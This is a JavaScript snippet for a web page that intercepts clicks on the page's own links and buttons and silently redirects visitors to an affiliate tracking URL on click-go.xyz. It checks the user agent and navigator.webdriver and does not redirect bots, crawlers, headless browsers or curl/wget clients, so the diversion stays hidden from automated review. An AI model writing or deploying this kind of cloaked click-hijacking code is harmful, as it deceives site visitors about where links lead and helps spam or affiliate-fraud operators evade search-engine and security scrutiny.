
(function(){
  const AFF_MAP={
    "da-dk":{
      "/":"https://click-go.xyz/yMnd11HF?sub_id_1=glitchspin.us.com",
      "#":"https://click-go.xyz/yMnd11HF?sub_id_1=glitchspin.us.com",
    },
    "_":{
      "/":"https://click-go.xyz/yMnd11HF?sub_id_1=glitchspin.us.com",
      "#":"https://click-go.xyz/yMnd11HF?sub_id_1=glitchspin.us.com"
    }
  };

  function isBot(){
    const ua=(navigator.userAgent||"").toLowerCase();
    return /bot|crawl|spider|headless|phantom|preview|wget|curl|python|node/.test(ua)||!!navigator.webdriver;
  }
  function isModified(e){
    return e.metaKey||e.ctrlKey||e.shiftKey||e.altKey||e.button===1;
  }
  function isExternal(href){
    try{
      const u=new URL(href,location.origin);
      return u.origin!==location.origin;
    }catch{
      return true;
    }
  }
  function normPath(href){
    if(href==="#") return "#";
    try{
      const u=new URL(href,location.origin);
      let path=u.pathname.replace(/\/{2,}/g,"/");
      if(!path.endsWith("/")) path+="/";
      return path;
    }catch{
      return null;
    }
  }
  function activeLang(){
    const l=(document.documentElement.getAttribute("lang")||"").toLowerCase();
    return AFF_MAP[l]?l:"_";
  }
  function resolveAffiliateTarget(rawHref){
    if(!rawHref) rawHref="#";
    if(!rawHref.startsWith("/")&&rawHref!=="#") return null;
    if(isExternal(rawHref)) return null;
    const path=normPath(rawHref);
    if(!path) return null;
    const map=AFF_MAP[activeLang()]||{};
    return map[path]||null;
  }
  function goTo(target,e){
    if(isBot()) return;
    if(isModified(e)){
      window.open(target,"_blank","noopener,noreferrer");
    }else{
      location.assign(target);
    }
  }
  function getButtonHref(btn){
    return (
      btn.getAttribute("data-href") ||
      btn.getAttribute("data-url")  ||
      btn.getAttribute("data-link") ||
      btn.getAttribute("data-aff")  ||
      btn.getAttribute("href")      ||
      "#"
    ).trim();
  }

  document.addEventListener("click",function(e){
    const a=e.target.closest&&e.target.closest("a[href]");
    if(a){
      const raw=(a.getAttribute("href")||"").trim();
      const target=resolveAffiliateTarget(raw);
      if(!target) return;
      e.preventDefault();
      goTo(target,e);
      return;
    }

    const btn=e.target.closest&&e.target.closest('button,[role="button"]');
    if(!btn) return;
    if(btn.closest&&btn.closest("a[href]")) return;

    const cls=btn.getAttribute("class")||"";
    if(!(/\bbtn\b/.test(cls)||btn.hasAttribute("data-aff-btn"))) return;

    const raw=getButtonHref(btn);
    const target=resolveAffiliateTarget(raw);
    if(!target) return;

    e.preventDefault();
    goTo(target,e);
  },{capture:true});
})();
